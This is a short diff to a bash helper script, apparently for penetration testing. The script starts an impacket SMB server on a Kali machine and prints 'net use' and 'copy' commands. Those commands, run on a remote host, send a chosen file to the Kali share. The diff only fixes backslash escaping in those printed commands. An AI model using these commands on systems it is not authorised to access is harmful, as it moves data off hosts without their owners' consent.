@@ -25,14 +25,14 @@ fi
 
 # Print the command to be run on the remote machine
 echo "The following command should be run on the remote machine:"
-echo "${PINK}net use \\\\$kaliIP\\share /user:$smb_user $smb_pass${RESET}"
+echo -e "${PINK}net use \\\\\\\\$kaliIP\\\\share /user:$smb_user $smb_pass${RESET}"
 
 # Prompt for the file path on the remote machine
 read -p "Enter the path to the file you want to copy: " file_path
 
 # Print the command to copy the file
 echo "To copy the file, run the following command on the remote machine:"
-echo "${PINK}copy $file_path \\\\$kaliIP\\share${RESET}"
+echo -e "${PINK}copy $file_path \\\\\\\\$kaliIP\\\\share${RESET}"
 
 # Run the impacket-smbserver command
 echo "Starting SMB server with username '$smb_user' and password '****' (password is hidden for security reasons)."
